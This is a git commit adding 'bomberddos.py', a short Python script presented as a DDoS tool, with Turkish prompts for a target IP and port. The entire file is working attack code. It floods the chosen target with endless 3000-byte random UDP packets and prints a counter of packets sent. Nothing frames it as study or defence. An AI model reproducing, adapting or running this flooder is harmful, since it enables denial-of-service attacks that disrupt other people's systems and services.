1e8595abbb182d1740c7157841766b2b524544de
Arseny <108670057+Neverkoo@users.noreply.github.com>
2022-08-03 11:37:31 +0300

    bomberddos.py
    Tool

---
+++ bomberddos.py
@@ -0,0 +1,24 @@
+import socket
+import random
+import os
+
+os.system("clear")
+banner="""
+##########################
+#   BomberDdos V1.0	 #
+#   Code by Neverkoo	 #
+##########################
+"""
+print(banner)
+
+hedef_ip=raw_input("hedef ip: ")
+hedef_port=input("hedef port: ")
+
+bytes=random._urandom(3000)
+sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+
+sayac=0
+while True:
+	sock.sendto(bytes,(hedef_ip,hedef_port))
+	sayac=sayac+1
+	print("saldiri baslatildi,gonderilen paket:%s"%(sayac))
